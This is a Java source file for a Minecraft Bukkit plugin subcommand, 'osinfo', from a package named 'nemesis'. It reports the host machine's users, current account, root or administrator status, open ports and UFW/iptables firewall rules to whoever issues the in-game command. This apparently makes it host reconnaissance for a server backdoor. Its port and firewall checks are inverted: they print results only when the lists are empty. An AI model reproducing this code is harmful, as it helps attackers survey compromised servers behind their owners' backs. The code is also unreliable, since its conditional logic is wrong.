package nemesis.commands.subcommands;

import org.bukkit.command.CommandSender;

import nemesis.Utils;
import nemesis.commands.SubCommand;

public class OSInfo implements SubCommand {

    @Override
    public void execute(CommandSender sender, String[] args) {
        sender.sendMessage(Utils.colorize(""));
        if (Utils.isLinux()) {
            sender.sendMessage(Utils.colorize("&aDistro: &f" + Utils.getLinuxDistro()));
            sender.sendMessage(Utils.colorize("&aLinux users: &f" + Utils.getLinuxUsers().toString().replace("[", "").replace("]", "")));
            sender.sendMessage(Utils.colorize("&aCurrent user: &f" + Utils.getLinuxUser()));
            sender.sendMessage(Utils.colorize("&aRoot access: &f" + (Utils.hasRootAccess() ? "Yes" : "No")));
            sender.sendMessage(Utils.colorize("&aOpened ports: &f" + (Utils.getOpenPorts().isEmpty() ? Utils.getOpenPorts().toString().replace("[", "").replace("]", "") : "Failed to get ports!")));
            sender.sendMessage(Utils.colorize("&aUFW Rules: &f" + (Utils.getUFWRules().isEmpty() ? Utils.getUFWRules().toString().replace("[", "").replace("]", "") : "Failed to get ports!")));
            sender.sendMessage(Utils.colorize("&aIpTable Rules: &f" + (Utils.getIptableRules().isEmpty() ? Utils.getIptableRules().toString().replace("[", "").replace("]", "") : "Failed to get ports!"))); 
        } else {
            sender.sendMessage(Utils.colorize("&aWindows users: &f" + Utils.getWindowsUsers().toString().replace("[", "").replace("]", "")));
            sender.sendMessage(Utils.colorize("&aCurrent user: &f" + Utils.getWindowsUser().toString().replace("[", "").replace("]", "")));
            sender.sendMessage(Utils.colorize("&aAdminstrator: &f" + (Utils.isWindowsAdmin() ? "Yes" : "No")));
        }
        sender.sendMessage(Utils.colorize(""));
    }

    @Override
    public String getName() {
        return "osinfo";
    }
}